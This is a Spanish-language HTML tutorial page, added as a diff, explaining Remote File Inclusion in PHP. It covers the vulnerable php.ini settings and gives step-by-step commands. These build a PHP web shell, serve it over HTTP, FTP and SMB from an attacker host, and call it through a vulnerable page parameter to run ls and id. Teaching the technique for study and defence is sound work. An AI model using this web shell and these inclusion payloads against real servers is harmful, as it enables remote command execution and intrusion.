@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="es-ES">
+     <head>
+  	<title>RFI</title>
+    	<meta charset="utf-8">
+    	<link rel="icon" type="image/png" href="../../img/logo.png" />
+        <link rel="stylesheet" href="../decoration/style.css"/>
+     </head>
+
+  	<body>
+      	<div class="cuerpo">
+        	<div class="contenido">
+  		        <h1 align="center">Remote File Inclusion</h1><br><br>
+
+  		        <p>Antes de adentrarnos en una técnica como la de <strong>Remote File Inclusion</strong>, debemos conocer todo aquello que engloba el <a href="./../lfi/LocalFileInclusion.html"><i><strong">Local File Inclusion</strong></i></a>.</p><br>
+
+              <p><strong>Remote File Inclusion</strong> permite incluir archivos remotos desde otro servidor debido a la mala utilización de las funciones para incluir archivos en PHP, como require(), include(), include_once(), require_once().</p><br>
+
+              <p>Para explotar esta vulnerabilidad, el servidor victima debe, en su archivo de configuración PHP (/etc/php/X.X/apache2/php.ini), tener en "On" las siguientes dos funciones:</p><br>
+
+              <ul>
+                <li type="circle"><strong>allow_url_fopen</strong>: Esta opción habilita los envoltorios fopen con reconocimiento de URL que permiten acceder a objetos como archivos de URL. Se proporcionan contenedores predeterminados para el acceso a archivos remotos mediante el protocolo ftp o http, algunas extensiones como zlib pueden registrar contenedores adicionales.<br> (Habilitada de forma predeterminada).</li>
+                <br>
+                <li type="circle"><strong>allow_url_include</strong>: Esta opción permite el uso de envoltorios fopen compatibles con URL con las siguientes funciones: include, include_once, require, require_once</li>
+              </ul>
+              <br><br>
+
+              <p>Para comprobar si el servidor es vulnerable a RFI, el atacante comparte un servidor HTTP por Python</p><br>
+
+              <pre rel="terminal"><code><font size="3" color="red">~$</font> python -m SimpleHTTPServer 8000
+Serving HTTP on 0.0.0.0 port 8000 ...</code></pre><br>
+                
+              <p>Hecho esto, accederá a él desde el parámetro vulnerable del servidor, buscando, por ejemplo, un recurso inexistente.</p><br>
+
+              <pre rel="url"><code>http://10.0.0.100/index.php?page=http://10.0.0.5:8000/file</code></pre><br>
+
+              <p>Hecho esto, iremos a la terminal donde hemos levantado un servidor HTTP y veremos si ha recibido una solicitud de acceso.</p><br>
+
+              <pre rel="terminal"><code>Serving HTTP on 0.0.0.0 port 8000 ...
+10.0.0.100 - - [11/Jan/2021 15:39:54] code 404, message File not found
+10.0.0.100 - - [11/Jan/2021 15:39:54] "GET /file HTTP/1.0" 404 -</code></pre><br>
+
+              <p>Aquí podemos ver que se ha intentado acceder al archivo "file", por lo que el servidor es vulnerable a RFI.</p><br>
+              
+              <p>Esto lo puede aprovechar un atacante compartiendo un archivo malicioso en su máquina, al cual accederá desde el servidor victima.<br><br>El primer paso será generar el archivo malicioso. Un truco es que el código php malicioso esté entre etiquetas pre formateadas, esto mejorará el output y se mostrará en el formato correcto.</p><br>
+
+              <pre rel="terminal"><code><font size="3" color="red">~$</font> echo '&ltpre&gt . &lt?php system($_GET['cmd']); ?&gt . &lt/pre&gt' &gt shell.php</code></pre><br>
+
+              <p>Tras esto se compartirá la carpeta que contiene el archivo malicioso.</p><br>
+
+              <pre rel="terminal"><code><font size="3" color="red">~$</font> python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</code></pre><br>
+
+              <p>Después el atacante accederá al archivo desde la url y ya podrá utilizar la variable cmd que ha definido para ejecutar comandos.</p><br>
+
+              <pre rel="url"><code>http://10.0.0.100/index.php?page=http://10.0.0.5:8000/shell.php&cmd=ls</code></pre><br>
+
+              <p>Logrando así, ejecutar el comando ls y mostrando el resultado por pantalla.</p><br>
+
+              <br><p>Para acceder a archivos externos no solo podemos utilizar el protocolo <strong>HTTP</strong>, también podemos usar el protocolo <strong>FTP</strong>, aquí se mostrará como.</p><br>
+
+              <p>De la misma manera creamos un archivo malicioso, pero esta vez, lo compartiremos por FTP, para ello usaremos la librería <strong>pyftpdlib</strong> de Python. La cuál no viene instalada por defecto y habrá que instalar</p> <br>
+
+              <pre rel="terminal"><code><font size="3" color="red">~$</font> pip install pyftpdlib</code></pre><br>
+
+              <p>Tras instalarla ya podremos compartir por python un servidor ftp por el puerto 21</p><br>
+
+              <pre rel="terminal"><code><font size="3" color="red">~$</font> python -m pyftpdlib -p 21</code></pre><br>
+
+              <p>Una vez compartido el archivo php malicioso por FTP, el atacante accedería a él desde el parámetro vulnerable de el servidor víctima, logrando así ejecución de comandos.</p><br>
+
+              <pre rel="url"><code>http://10.0.0.100/index.php?page=ftp://10.0.0.5:21/shell.php&cmd=id</code></pre><br>
+
+              <p>Devolviéndonos por pantalla el resultado del comando id.</p><br>
+
+              <p>Algo interesante que debemos tener claro es que para estos ataques necesitamos que la flag <strong>allow_url_include</strong> esté habilitada. Pero en equipos windows hay una forma de evadir esto y es utilizando el protocolo SMB, esto es posible ya que Windows trata los archivos de servidores SMB remotos como archivos normales, a los que se puede hacer referencia directamente con una ruta UNC. Podemos activar un servidor SMB utilizando smbserver.py de Impacket, que permite la autenticación anónima de forma predeterminada.<br>
+              Esta herramienta la podemos clonar de la siguiente url:<br>
+              <a href="https://github.com/SecureAuthCorp/impacket/">https://github.com/SecureAuthCorp/impacket/</a></p><br>
+
+              <p>Y se usa de la siguiente manera:</p><br>
+
+              <pre rel="terminal"><code><font size="3" color="red">~$</font> smbserver.py -smb2support share $(pwd)</code></pre><br>
+
+              <p>Aquí el atacante ha compartido el directorio donde tiene el archivo PHP malicioso con el nombre share. Para evitar problemas podemos añadir el parámetro <strong>-smb2support</strong>.</p><br>
+
+              <p>Si el atacante accede al archivo desde el parámetro vulnerable del servidor víctima, podrá utilizar la variable cmd para ejecutar comandos de esta manera.</p><br>
+
+              <pre rel="url"><code>http://10.0.0.100/index.php?page=\\10.0.0.5\share\shell.php&cmd=id</code></pre><br>
+  
+              <p>Devolviendo por pantalla el resultado del comando.</p>
+        	</div>
+    	</div>
+    	<footer>
+      		<marquee>Remote File Inclusion</marquee>
+    	</footer>
+  	</body>
+</html>
